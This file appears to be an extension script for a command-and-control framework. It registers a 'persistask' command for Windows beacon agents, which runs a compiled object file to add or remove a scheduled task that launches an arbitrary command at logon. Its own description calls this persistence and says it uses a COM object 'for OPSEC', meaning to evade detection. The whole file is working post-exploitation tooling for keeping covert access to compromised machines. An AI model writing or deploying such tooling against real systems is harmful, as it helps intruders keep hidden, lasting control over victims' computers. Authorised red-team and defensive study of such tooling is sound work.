let cmd = ax.create_command(
    "persistask",
    "Set scheduled task to launch at logon for persistence. Uses COM object to create task for OPSEC.",
    "persistask <add|remove> <task name> <command to run>"
);

cmd.addArgString("action",    true, "add or remove");
cmd.addArgString("task_name", true, "Name of the scheduled task");
cmd.addArgString("command",   true, "Command to run");

cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let action   = parsed_json["action"];
    let taskName = parsed_json["task_name"];
    let command  = parsed_json["command"];

    let bof_path = ax.script_dir() + "_bin/persistask." + ax.arch(id) + ".o";
    let args     = ax.bof_pack("cstr,cstr,cstr", [action, taskName, command]);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "Running persistask.");
});

let group = ax.create_commands_group("persistask", [cmd]);
ax.register_commands_group(group, ["beacon"], ["windows"], []);
